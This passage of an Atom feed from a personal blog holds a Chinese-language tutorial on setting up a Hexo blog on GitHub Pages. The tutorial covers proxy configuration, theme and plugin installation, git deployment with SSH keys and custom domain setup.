        &lt;p&gt;一直都想填的一个坑，之前也想写文章记录一下，由于太忙了水了水就过去了，昨天又遇到了相关的情况，并且很多问题也是之前没有理解清楚的，特此记录一番。 // 刚好作为每天水文。&lt;/p&gt;
&lt;h2 id=&quot;0x00-原理&quot;&gt;&lt;a href=&quot;#0x00-原理&quot; class=&quot;head
      
    
    </summary>
    
    
    
  </entry>
  
  <entry>
    <title>Hexo 博客搭建</title>
    <link href="http://a1ne.github.io/2020/03/30/Hexo-%E5%8D%9A%E5%AE%A2%E6%90%AD%E5%BB%BA/"/>
    <id>http://a1ne.github.io/2020/03/30/Hexo-%E5%8D%9A%E5%AE%A2%E6%90%AD%E5%BB%BA/</id>
    <published>2020-03-31T00:03:01.000Z</published>
    <updated>2020-03-31T00:50:44.278Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Hexo-博客搭建过程记录"><a href="#Hexo-博客搭建过程记录" class="headerlink" title="Hexo 博客搭建过程记录"></a>Hexo 博客搭建过程记录</h1><blockquote><p>环境: github账号一枚(包括用户名同名reposity,如a1ne.github.io)、node、git bash</p></blockquote><h2 id="Github"><a href="#Github" class="headerlink" title="Github"></a>Github</h2><p>注册 ——&gt; 创建Reposity ——&gt;$(username).github.io</p><h2 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h2><p>直接官网下载node安装包以及git安装包傻瓜安装(为了方便建议自定义路径)即可</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">node -v </span><br><span class="line">npm -v </span><br><span class="line">git -v  安装了git后一般会添加注册表 右键能够看到git bash&#x2F;git gui</span><br></pre></td></tr></table></figure><h2 id="Hexo安装"><a href="#Hexo安装" class="headerlink" title="Hexo安装"></a>Hexo安装</h2><p>因为某些不可描述的原因，直接npm 或者git会显得很慢，可以适当配置一下代理或者安装淘宝的npm镜像源</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">git config --global http.proxy &quot;socks5:&#x2F;&#x2F;127.0.0.1:1080&quot;</span><br><span class="line">git config --global https.proxy &quot;socks5:&#x2F;&#x2F;127.0.0.1:1080&quot;</span><br><span class="line"></span><br><span class="line">git config --gloabl --unset http.proxy 即可取消</span><br><span class="line"></span><br><span class="line">同理</span><br><span class="line">npm config set proxy socks5:&#x2F;&#x2F;127.0.0.1:1080</span><br><span class="line">npm config set https-proxy socks5:&#x2F;&#x2F;127.0.0.1:1080</span><br><span class="line"></span><br><span class="line">npm config delete proxy</span><br><span class="line"></span><br><span class="line">npm install hexo-cli -g</span><br></pre></td></tr></table></figure><h2 id="博客搭建"><a href="#博客搭建" class="headerlink" title="博客搭建"></a>博客搭建</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line">~初步建立</span><br><span class="line">mkdir&#x2F;md blog_directory</span><br><span class="line">hexo init</span><br><span class="line">npm install 安装依赖(可能不需要)</span><br><span class="line">hexo g  生成内容</span><br><span class="line">hexo s(erver) 本地监听查看</span><br><span class="line"></span><br><span class="line">访问即可看到搭建好的blog 至于字段内容需要自行在_config.yml中修改</span><br><span class="line"></span><br><span class="line">~安装主题</span><br><span class="line">$ git clone https:&#x2F;&#x2F;github.com&#x2F;iissnan&#x2F;hexo-theme-next themes&#x2F;next</span><br><span class="line">修改_config.yml中Theme字段为next即可</span><br><span class="line"></span><br><span class="line">~安装插件</span><br><span class="line">$ npm install hexo-generator-feed</span><br><span class="line">$ npm install hexo-generator-sitemap</span><br><span class="line"></span><br><span class="line">安装后再_config.yml中添加</span><br><span class="line">#Extensions</span><br><span class="line">plugins: hexo-generator-feed </span><br><span class="line">#- hexo-generator-sitemap </span><br><span class="line"></span><br><span class="line">feed:</span><br><span class="line">  type: atom ## atom&#x2F;rss2</span><br><span class="line">  path: atom.xml ##feed path</span><br><span class="line">  limit: 20  ##feed  minimum number of files</span><br><span class="line"></span><br><span class="line">$ npm install hexo-admin --save        编辑组件</span><br><span class="line">安装直接在本地监听启动后访问http:&#x2F;&#x2F;localhost:4000&#x2F;admin&#x2F; 即可</span><br><span class="line"></span><br><span class="line">~远程部署</span><br><span class="line">$ npm install hexo-deployer-git --save </span><br><span class="line">修改_config.yml中内容</span><br><span class="line"># Deployment</span><br><span class="line">## Docs: https:&#x2F;&#x2F;hexo.io&#x2F;docs&#x2F;deployment.html</span><br><span class="line">deploy:</span><br><span class="line">   type: git &#x2F;&#x2F;高版本只能是git</span><br><span class="line">   repository: https:&#x2F;&#x2F;github.com&#x2F;A1ne&#x2F;a1ne.github.io.git    &#x2F;&#x2F;github中进入reposity 选择https方式可看到 </span><br><span class="line">   branch: master   </span><br><span class="line">   message: update </span><br><span class="line">   </span><br><span class="line">保存后</span><br><span class="line">hexo clean</span><br><span class="line">hexo generate</span><br><span class="line">hexo deploy   会提示输入账号密码 如果为了方便也可以使用公私钥</span><br><span class="line"></span><br><span class="line">git bash中执行 ssh-keygen -t rsa -C &quot;email&quot;</span><br><span class="line">生成的id_rsa和id_rea.pub文件  将id_rsa.pub文件内容复制到github设置中的SSH and GPG key中即可</span><br><span class="line">ssh -T git@github.com  测试 </span><br><span class="line">当然在deploy配置中的repository需要修改成ssh类型链接</span><br><span class="line"></span><br><span class="line">~ 域名指定</span><br><span class="line">直接在blog source目录创建CNAME文件 写入映射的域名</span><br><span class="line">在域名提供后台管理DNS解析 创建CNAME记录指向$(username).github.io即可</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;Hexo-博客搭建过程记录&quot;&gt;&lt;a href=&quot;#Hexo-博客搭建过程记录&quot; class=&quot;headerlink&quot; title=&quot;Hexo 博客搭建过程记录&quot;&gt;&lt;/a&gt;Hexo 博客搭建过程记录&lt;/h1&gt;&lt;blockquote&gt;
&lt;p&gt;环境: github账号一
      
    
    </summary>
    
    
    
  </entry>
  
</feed>
